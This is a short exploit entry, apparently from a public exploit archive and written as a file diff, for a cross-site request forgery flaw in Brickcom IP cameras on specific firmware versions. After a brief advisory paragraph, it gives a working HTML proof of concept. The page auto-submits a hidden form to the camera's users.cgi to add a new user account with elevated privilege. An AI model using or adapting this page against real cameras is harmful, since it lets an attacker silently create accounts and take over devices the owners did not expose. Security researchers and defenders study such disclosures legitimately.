@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/60526/info
+
+Brickcom multiple IP cameras are prone to a cross-site request-forgery vulnerability.
+
+Exploiting this issue may allow a remote attacker to perform certain unauthorized actions and gain access to the affected application. Other attacks are also possible.
+
+Brickcom cameras running firmware 3.0.6.7, 3.0.6.12, and 3.0.6.16C1 are vulnerable; other versions may also be affected. 
+
+<html>
+<body>
+<form name="gobap" action="http://xx.xx.xx.xx/cgi-bin/users.cgi"; method="POST">
+<input type="hidden" name="action" value="add">
+<input type="hidden" name="index" value="0">
+<input type="hidden" name="username" value="test2">
+<input type="hidden" name="password" value="test2">
+<input type="hidden" name="privilege" value="1">
+<script>document.gobap.submit();</script>
+</form>
+</body>
+</html> 
